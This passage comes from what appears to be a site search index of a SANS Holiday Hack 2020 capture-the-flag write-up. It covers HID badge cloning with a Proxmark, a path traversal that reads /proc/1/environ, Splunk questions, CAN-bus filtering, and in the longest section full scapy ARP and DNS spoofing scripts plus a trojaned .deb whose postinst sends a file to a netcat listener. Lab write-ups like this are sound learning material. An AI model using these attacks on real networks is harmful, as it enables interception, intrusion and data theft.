Recovery"},{"location":"objectives/obj3/#courtyard","text":"","title":"Courtyard"},{"location":"objectives/obj3/#sugarplum-mary-point-of-sale-password-recovery","text":"Terminal Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet. Hint There are tools and guides explaining how to extract ASAR from Electron apps. It's possible to extract the source code from an Electron app . When trying to open the terminal, it says the termianl is locked and you can download an offline version to inspect at Running the santa-shop.exe, it installed the application in C:\\Users\\cyber\\AppData\\Local\\Programs I installed npm's asar as recommended in the Medium hint above and extracted the source code. npx asar extract app.asar santa-source/ A simple text search in the directory showed the password as santapass Entering the password brings me to a Point of Sale terminal Success santapass","title":"Sugarplum Mary  - Point-of-Sale Password Recovery"},{"location":"objectives/obj4/","text":"Workshop Open HID Lock We are trying to power the elevator. I'm just including a full visual of the elevator. After retrieving the items around the workshop, and getting the key to the panel, we can open the back panel and get the elevator rocking.","title":"Objective 4 - Elevator"},{"location":"objectives/obj4/#workshop","text":"","title":"Workshop"},{"location":"objectives/obj4/#open-hid-lock","text":"We are trying to power the elevator. I'm just including a full visual of the elevator. After retrieving the items around the workshop, and getting the key to the panel, we can open the back panel and get the elevator rocking.","title":"Open HID Lock"},{"location":"objectives/obj5/","text":"Workshop Open HID Lock Challenge Talk to Busy Evergreen near talk tracks and Fitzy Shortstack in kitchen for tips. The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. The Track 4 is also specific to proxmark card hacking Shortstack says \"You know, Santa really seems to trust Shinny Upatree...\" I have a proxmark in my inventory with a cli. Just need to get near someone with a badge. Based on the hint from Fitzy, I believe I need to get \"Shinny\"s badge. The commands appear to be lf hid read and lf hid sim -r 234123 After getting next to Shinny Upatree, I opened the proxmark CLI and ran the commands lf hid sim -r 2006e22f13 Success Running this command opened up the HID display in Santa's Workshop I went through the door, and now I'm Santa? I'm super confused. This gives me access to Santa's office","title":"Objective 5 - HID"},{"location":"objectives/obj5/#workshop","text":"","title":"Workshop"},{"location":"objectives/obj5/#open-hid-lock","text":"Challenge Talk to Busy Evergreen near talk tracks and Fitzy Shortstack in kitchen for tips. The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. The Track 4 is also specific to proxmark card hacking Shortstack says \"You know, Santa really seems to trust Shinny Upatree...\" I have a proxmark in my inventory with a cli. Just need to get near someone with a badge. Based on the hint from Fitzy, I believe I need to get \"Shinny\"s badge. The commands appear to be lf hid read and lf hid sim -r 234123 After getting next to Shinny Upatree, I opened the proxmark CLI and ran the commands lf hid sim -r 2006e22f13 Success Running this command opened up the HID display in Santa's Workshop I went through the door, and now I'm Santa? I'm super confused. This gives me access to Santa's office","title":"Open HID Lock"},{"location":"objectives/obj6/","text":"Great Room Angel Candysalt - Splunk Challenge Challenge Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up. There are alot of questions for this one. Rather than detailing how I arrived at each one, I just have a quick answer for each. Q1 How many distinct MITRE ATT&CK techniques did Alice emulate? 13 Q2 What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) t1059.003-main t1059.003-win Q3 One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Q4 According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) index=attack OSTAP and found the first timecode at 2020-11-30T17:44:15Z Q5 One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? hint - Oh this was a fun one. It takes a bit of pivoting... There is a repo called https://github.com/frgnca/AudioDeviceCmdlets that controls audio capture devices. searching for \"audio\" provided two. T1123 is the attack field. index=\" \" vendor_product=\"Microsoft Sysmon\" EventCode=1 *Audio 3648 Q7 Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Looking through all the bat files index=\"*\" *.bat* I find one that pointed to the GitHub with mutliple lines \\T1074.001\\src\\Discovery.bat quser Q8 According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? I did not know if I should leave this one in here because it uses the old name for Zeek! In the meantime, I wanted them to look at something like index=* sourcetype=bro* and check out the SSL/TLS certs that are captured in the x509-related sourcetype. This query index=* sourcetype=bro* sourcetype=\"bro:x509:json\" \"certificate.issuer\"=\"CN=win-dc-748.attackrange.local\" finds the seriel of 55FCEEBB21270D9249E86F4B9DC7AA60 BONUS The favorite phrase is \"Stay Frosty\" This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: 7FXjP1lyfKbyDK/MChyf36h7 It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one! The Lollipop Guild Minty's Response Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it.","title":"Objective 6 - Splunk Challenge"},{"location":"objectives/obj6/#great-room","text":"","title":"Great Room"},{"location":"objectives/obj6/#angel-candysalt-splunk-challenge","text":"Challenge Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up. There are alot of questions for this one. Rather than detailing how I arrived at each one, I just have a quick answer for each.","title":"Angel Candysalt  - Splunk Challenge"},{"location":"objectives/obj6/#q1","text":"How many distinct MITRE ATT&CK techniques did Alice emulate? 13","title":"Q1"},{"location":"objectives/obj6/#q2","text":"What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) t1059.003-main t1059.003-win","title":"Q2"},{"location":"objectives/obj6/#q3","text":"One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography","title":"Q3"},{"location":"objectives/obj6/#q4","text":"According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) index=attack OSTAP and found the first timecode at 2020-11-30T17:44:15Z","title":"Q4"},{"location":"objectives/obj6/#q5","text":"One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? hint - Oh this was a fun one. It takes a bit of pivoting... There is a repo called https://github.com/frgnca/AudioDeviceCmdlets that controls audio capture devices. searching for \"audio\" provided two. T1123 is the attack field. index=\" \" vendor_product=\"Microsoft Sysmon\" EventCode=1 *Audio 3648","title":"Q5"},{"location":"objectives/obj6/#q7","text":"Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Looking through all the bat files index=\"*\" *.bat* I find one that pointed to the GitHub with mutliple lines \\T1074.001\\src\\Discovery.bat quser","title":"Q7"},{"location":"objectives/obj6/#q8","text":"According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? I did not know if I should leave this one in here because it uses the old name for Zeek! In the meantime, I wanted them to look at something like index=* sourcetype=bro* and check out the SSL/TLS certs that are captured in the x509-related sourcetype. This query index=* sourcetype=bro* sourcetype=\"bro:x509:json\" \"certificate.issuer\"=\"CN=win-dc-748.attackrange.local\" finds the seriel of 55FCEEBB21270D9249E86F4B9DC7AA60","title":"Q8"},{"location":"objectives/obj6/#bonus","text":"The favorite phrase is \"Stay Frosty\" This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: 7FXjP1lyfKbyDK/MChyf36h7 It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one! The Lollipop Guild Minty's Response Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it.","title":"BONUS"},{"location":"objectives/obj7/","text":"Netwars Wunhorse Openslae - Sleigh Challenge AS PLAYER: Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes. For security reasons, only Santa is allowed access to the sled and its CAN-D bus. I'll hit him up next time he's nearby. AS SANTA: Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it. Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. The talk is CAN Bus Can-Can From the hints, the brakes and door locks are the focus. There is alot of data flying through, one of them is the problem. But not all. We need to discover what the buttons on the left hand side do. But first, we need to get all the running data to stop. I looked at the screen shot and added all those values to the exclude all Now, lets try and figure out the CAN values for the other items Note In order to figure out what the numbers were, I would take screenshots in order to read them. Start/Stop START - 02A#00FF00 STOP - 02A#0000FF RPM 244#000000XXXX - Seems to be RPM Lock/Unlock 19B#000000000000 < Lock 19B#00000F000000 < Unlock There are other 19B that are not lock/unlock. 19B#0000000F2057 <- Suspicious. Happens randomly. That might be a sensor, but unlikely. This is probably the funny door. Steering 019 - Steering. 00000000 is Steering at zero. 019 - 00000033 - That is at 50 (right) 019 - FFFFFFCD - That is at -50 (left). Signed value Brake - 080 With no brake, the values is 000000 < 6 places, not 8 080 - Turning up the brake seems to make it go from \"00000F\" to \"FFFFF?\". Why would it be oscillating? This is likely causing the brakes to shudder Unknown 188 - Just showing 000000000. Its a red herring and I discarded it since it did not appear to be part of brakes or door locks. Combo Attempts that worked 080 Less Than 00000000 19B equals 00000F2057","title":"Objective 7 - CAN-Bus"},{"location":"objectives/obj7/#netwars","text":"","title":"Netwars"},{"location":"objectives/obj7/#wunhorse-openslae-sleigh","text":"Challenge AS PLAYER: Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes. For security reasons, only Santa is allowed access to the sled and its CAN-D bus. I'll hit him up next time he's nearby. AS SANTA: Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it. Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. The talk is CAN Bus Can-Can From the hints, the brakes and door locks are the focus. There is alot of data flying through, one of them is the problem. But not all. We need to discover what the buttons on the left hand side do. But first, we need to get all the running data to stop. I looked at the screen shot and added all those values to the exclude all Now, lets try and figure out the CAN values for the other items Note In order to figure out what the numbers were, I would take screenshots in order to read them.","title":"Wunhorse Openslae  - Sleigh"},{"location":"objectives/obj7/#startstop","text":"START - 02A#00FF00 STOP - 02A#0000FF","title":"Start/Stop"},{"location":"objectives/obj7/#rpm","text":"244#000000XXXX - Seems to be RPM","title":"RPM"},{"location":"objectives/obj7/#lockunlock","text":"19B#000000000000 < Lock 19B#00000F000000 < Unlock There are other 19B that are not lock/unlock. 19B#0000000F2057 <- Suspicious. Happens randomly. That might be a sensor, but unlikely. This is probably the funny door.","title":"Lock/Unlock"},{"location":"objectives/obj7/#steering","text":"019 - Steering. 00000000 is Steering at zero. 019 - 00000033 - That is at 50 (right) 019 - FFFFFFCD - That is at -50 (left). Signed value","title":"Steering"},{"location":"objectives/obj7/#brake-080","text":"With no brake, the values is 000000 < 6 places, not 8 080 - Turning up the brake seems to make it go from \"00000F\" to \"FFFFF?\". Why would it be oscillating? This is likely causing the brakes to shudder","title":"Brake - 080"},{"location":"objectives/obj7/#unknown","text":"188 - Just showing 000000000. Its a red herring and I discarded it since it did not appear to be part of brakes or door locks.","title":"Unknown"},{"location":"objectives/obj7/#combo-attempts-that-worked","text":"080 Less Than 00000000 19B equals 00000F2057","title":"Combo Attempts that worked"},{"location":"objectives/obj8/","text":"Wrapping Room Noel Boetie - Tag Generator Challenge Welcome to the Wrapping Room, Santa! The tag generator is acting up. I feel like the issue has something to do with weird files being uploaded. Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this Hint Once you know the path to the file, we need a way to download it! Can you figure out the path to the script? It's probably on error pages! If you find a way to execute code blindly, I bet you can redirect to a file then download that file! If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! Is there an endpoint that will print arbitrary files? We might be able to find the problem if we can get source code! I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark? Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output! ' Notes When uploading a TXT file, I get the error: Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201230-1-1mw36uh.txt Looking through the javascript code, I see how the file is returned. With /image?id= . So, I just provided the location of the ruby app. https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb That downloaded the ruby code. The code has filename validations removed. That is the big hint. Using this, we just queried the server to return the processes environment variables https://tag-generator.kringlecastle.com/image?id=../../../../../proc/1/environ Success The GREETZ environment variable is \"JackFrostWasHere\" Noel Boetie Yay! You found the flaw! We'll work on fixing it.","title":"Objective 8 - Tag Generator"},{"location":"objectives/obj8/#wrapping-room","text":"","title":"Wrapping Room"},{"location":"objectives/obj8/#noel-boetie-tag-generator","text":"Challenge Welcome to the Wrapping Room, Santa! The tag generator is acting up. I feel like the issue has something to do with weird files being uploaded. Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this Hint Once you know the path to the file, we need a way to download it! Can you figure out the path to the script? It's probably on error pages! If you find a way to execute code blindly, I bet you can redirect to a file then download that file! If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! Is there an endpoint that will print arbitrary files? We might be able to find the problem if we can get source code! I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark? Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output! '","title":"Noel Boetie  - Tag Generator"},{"location":"objectives/obj8/#notes","text":"When uploading a TXT file, I get the error: Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201230-1-1mw36uh.txt Looking through the javascript code, I see how the file is returned. With /image?id= . So, I just provided the location of the ruby app. https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb That downloaded the ruby code. The code has filename validations removed. That is the big hint. Using this, we just queried the server to return the processes environment variables https://tag-generator.kringlecastle.com/image?id=../../../../../proc/1/environ Success The GREETZ environment variable is \"JackFrostWasHere\" Noel Boetie Yay! You found the flaw! We'll work on fixing it.","title":"Notes"},{"location":"objectives/obj9/","text":"Netwars Alabaster Snowball - ARP Shenanigans Challenge Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa. Hint Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts. Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP. The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file ARP pcap DNS pcap Launch webserver with cd /my/directory/with/files python3 -m http.server 80 The Plan Arp poison with scapy DNS Response for the webserver Webserver in python Serve up the customized .deb file with our webserver that will send the target file back through Netcat Gathering Info Running the TCP Dump command tcpdump -nni eth0 shows: 22:03:28.994209 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 We need to spoof that arp reply Printing out the values of the submitted arp request, I get ###[ Ethernet ]### dst = ff:ff:ff:ff:ff:ff src = 4c:24:57:ab:ed:84 type = ARP ###[ ARP ]### hwtype = 0x1 ptype = IPv4 hwlen = 6 plen = 4 op = who-has hwsrc = 4c:24:57:ab:ed:84 psrc = 10 .6.6.35 hwdst = 00 :00:00:00:00:00 pdst = 10 .6.6.53 The code works, and this is the DNS return record 22 :55:30.842607 IP 10 .6.6.35.59388 > 10 .6.6.53.53: 0 + A? ftp.osuosl.o\u2502 rg. ( 32 ) \u2502 0x0000: 4500 003c 0001 0000 4011 5a4d 0a06 0623 \u2502 0x0010: 0a06 0635 e7fc 0035 0028 5261 0000 0100 \u2502 0x0020: 0001 0000 0000 0000 0366 7470 066f 7375 \u2502 0x0030: 6f73 6c03 6f72 6700 0001 0001 Its a DNS request for ftp.osuosl.org The ARP request is looking for a DNS server. Then, there is a request for ftp.osuosl.org. The system then makes a DNS request. The DNS request will be: 10.6.6.35 - - [30/Dec/2020 23:32:42] \"GET /pub/jfrost/backdoor/suriv_amd64.d\u2502. How to run the commands First, create a file dns.py and arp.py Python file. Then, make then executables and start them off running. (click to open) ARP.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # Our eth0 mac address macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) def handle_arp_packets ( packet ): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet [ ARP ] . op == 1 : ether_resp = Ether ( dst = packet [ ARP ] . hwsrc , type = 0x806 , src = macaddr ) arp_response = ARP ( pdst = packet [ ARP ] . psrc ) arp_response . op = 2 arp_response . plen = 4 arp_response . hwlen = 6 arp_response . ptype = 0x800 arp_response . hwtype = 0x1 arp_response . hwsrc = macaddr arp_response . psrc = packet [ ARP ] . pdst arp_response . hwdst = packet [ ARP ] . hwsrc arp_response . pdst = packet [ ARP ] . psrc response = ether_resp / arp_response print ( packet . show ()) print ( response . show ()) sendp ( response , iface = \"eth0\" ) def main (): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff ( filter = berkeley_packet_filter , prn = handle_arp_packets , store = 0 , count = 1 ) if __name__ == \"__main__\" : value = True while ( value ): main () (click to open) DNS.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # Our Mac Addr macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) # destination ip we arp spoofed #ipaddr_we_arp_spoofed = \"10.6.1.10\" ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = packet [ Ether ] . dst , dst = packet [ Ether ] . src ) # need to replace mac addresses ip = IP ( dst = packet [ IP ] . src , src = packet [ IP ] . dst ) # need to replace IP addresses udp = UDP ( dport = packet [ UDP ] . sport , sport = packet [ UDP ] . dport ) # need to replace ports dns = DNS ( id = packet [ DNS ] . id , qr = 1 , ancount = 1 , qd = packet [ DNS ] . qd , an = DNSRR ( rrname = packet [ DNS ] . qd . qname , ttl = 10 , rdata = ipaddr ) # MISSING DNS RESPONSE LAYER VALUES ) dns_response = eth / ip / udp / dns print ( packet . show ()) print ( dns_response . show ()) sendp ( dns_response , iface = \"eth0\" ) def main (): berkeley_packet_filter = \" and \" . join ( [ \"udp dst port 53\" , # dns \"udp[10] & 0x80 = 0\" , # dns request \"dst host {} \" . format ( ipaddr_we_arp_spoofed ), # destination ip we had spoofed (not our real ip) \"ether dst host {} \" . format ( macaddr ) # our macaddress since we spoofed the ip to our mac ]) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff ( filter = berkeley_packet_filter , prn = handle_dns_request , store = 0 , iface = \"eth0\" , count = 1 ) if __name__ == \"__main__\" : value = True while ( value ): main () First, I used 4 windows to do this. /usr/bin/tmux split-window -hb chmod +x dns.py chmod +x arp.py nohup ./dns.py & nohup ./arp.py & Now, move to a new TMUX window and launch the webserver. mkdir -p www/pub/jfrost/backdoor cd www python3 -m http.server 80 Next, start up a Netcat listener to save to a file. ctrl+b+o nc -l -p 1234 > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt Lastly, build the .deb from the netcat and copy it to the properly location for the webserver call to pick it up ctrl+b+o mkdir build cd build cp ../debs/ cp ../debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb ./ dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work mkdir work/DEBIAN ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb tar -xvf control.tar.xz ./control tar -xvf control.tar.xz ./postinst cp control work/DEBIAN/ cp postinst work/DEBIAN/ IP = $( /sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1 ) HACK = '#!/bin/bash\\nnc -w 3 ' $IP ' 1234 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' echo -e \" $HACK \" > hack.sh cp hack.sh ./work/usr/ chmod +x ./work/usr/hack.sh cp postinst work/DEBIAN/ echo \"sudo chmod 2755 /usr/hack.sh && /usr/hack.sh &\" >> work/DEBIAN/postinst dpkg-deb --build ./work cp work.deb ../www/pub/jfrost/backdoor/suriv_amd64.deb Eventually, this returned the proper file, whose contents are below. (click to open) NORTH_POLE_Land_Use_Board_Meeting_Minuntes NORTH POLE LAND USE BOARD MEETING MINUTES January 20, 2020 Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time. Roll call of Board members please: Chairman Jack Frost - Present Vice Chairman Mother Nature - Present Superman - Present Clarice - Present Yukon Cornelius - HERE! Ginger Breaddie - Present King Moonracer - Present Mrs. Donner - Present Tanta Kringle - Present Charlie In-the-Box - Here Krampus - Growl Dolly - Present Snow Miser - Heya! Alabaster Snowball - Hello Queen of the Winter Spirits - Present ALSO PRESENT: Kris Kringle Pepper Minstix Heat Miser Father Time Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting. Review minutes for December 2020 meeting. Motion to accept \u2013 Mrs. Donner. Second \u2013 Superman. Minutes approved. OLD BUSINESS: No Old Business. RESOLUTIONS: The board took up final discussions of the plans presented last year for the expansion of Santa\u2019s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle. Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, \u201cThese changes will put a heavy toll on the infrastructure of the North Pole.\u201d Mr. Krampus replied, \u201cThe infrastructure has already been expanded to handle it quite easily.\u201d Chairman Frost then noted, \u201cBut the additional traffic will be a burden on local residents.\u201d Dolly explained traffic projections were all in alignment with existing roadways. Chairman Frost then exclaimed, \u201cBut with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as \u2018The Frostiest Place on Earth?\u2019\u201d Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board. Mrs. Nature made a motion to approve. Seconded by Mr. Cornelius. Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life. Approved: Mother Nature Superman Clarice Yukon Cornelius Ginger Breaddie King Moonracer Mrs. Donner Charlie In the Box Krampus Dolly Snow Miser Alabaster Snowball Queen of the Winter Spirits Opposed: Jack Frost Resolution carries. Construction approved. NEW BUSINESS: Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc. Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time\u2019s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000 BTUs, a figure she considers \u201cincredibly high for a building that size, likely two orders of magnitude too high. Why, it might burn the whole North Pole down!\u201d Mr. H. Miser replied with a laugh, \u201cThat\u2019s the whole point!\u201d The board voted unanimously to reject the initial proposal, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time\u2019s castle heating system. Motion to adjourn \u2013 So moved, Krampus. Second \u2013 Clarice. All in favor \u2013 aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan. Meeting adjourned. (END) Success Answer = \"Tanta Kringle\" recused herself Noel Boetie Yay! You found the flaw! We'll work on fixing it.","title":"Objective 9 - ARP Shenanigans"},{"location":"objectives/obj9/#netwars","text":"","title":"Netwars"},{"location":"objectives/obj9/#alabaster-snowball-arp-shenanigans","text":"Challenge Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa. Hint Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts. Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP. The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file ARP pcap DNS pcap Launch webserver with cd /my/directory/with/files python3 -m http.server 80","title":"Alabaster Snowball  - ARP Shenanigans"},{"location":"objectives/obj9/#the-plan","text":"Arp poison with scapy DNS Response for the webserver Webserver in python Serve up the customized .deb file with our webserver that will send the target file back through Netcat","title":"The Plan"},{"location":"objectives/obj9/#gathering-info","text":"Running the TCP Dump command tcpdump -nni eth0 shows: 22:03:28.994209 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 We need to spoof that arp reply Printing out the values of the submitted arp request, I get ###[ Ethernet ]### dst = ff:ff:ff:ff:ff:ff src = 4c:24:57:ab:ed:84 type = ARP ###[ ARP ]### hwtype = 0x1 ptype = IPv4 hwlen = 6 plen = 4 op = who-has hwsrc = 4c:24:57:ab:ed:84 psrc = 10 .6.6.35 hwdst = 00 :00:00:00:00:00 pdst = 10 .6.6.53 The code works, and this is the DNS return record 22 :55:30.842607 IP 10 .6.6.35.59388 > 10 .6.6.53.53: 0 + A? ftp.osuosl.o\u2502 rg. ( 32 ) \u2502 0x0000: 4500 003c 0001 0000 4011 5a4d 0a06 0623 \u2502 0x0010: 0a06 0635 e7fc 0035 0028 5261 0000 0100 \u2502 0x0020: 0001 0000 0000 0000 0366 7470 066f 7375 \u2502 0x0030: 6f73 6c03 6f72 6700 0001 0001 Its a DNS request for ftp.osuosl.org The ARP request is looking for a DNS server. Then, there is a request for ftp.osuosl.org. The system then makes a DNS request. The DNS request will be: 10.6.6.35 - - [30/Dec/2020 23:32:42] \"GET /pub/jfrost/backdoor/suriv_amd64.d\u2502.","title":"Gathering Info"},{"location":"objectives/obj9/#how-to-run-the-commands","text":"First, create a file dns.py and arp.py Python file. Then, make then executables and start them off running. (click to open) ARP.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # Our eth0 mac address macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) def handle_arp_packets ( packet ): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet [ ARP ] . op == 1 : ether_resp = Ether ( dst = packet [ ARP ] . hwsrc , type = 0x806 , src = macaddr ) arp_response = ARP ( pdst = packet [ ARP ] . psrc ) arp_response . op = 2 arp_response . plen = 4 arp_response . hwlen = 6 arp_response . ptype = 0x800 arp_response . hwtype = 0x1 arp_response . hwsrc = macaddr arp_response . psrc = packet [ ARP ] . pdst arp_response . hwdst = packet [ ARP ] . hwsrc arp_response . pdst = packet [ ARP ] . psrc response = ether_resp / arp_response print ( packet . show ()) print ( response . show ()) sendp ( response , iface = \"eth0\" ) def main (): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff ( filter = berkeley_packet_filter , prn = handle_arp_packets , store = 0 , count = 1 ) if __name__ == \"__main__\" : value = True while ( value ): main () (click to open) DNS.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # 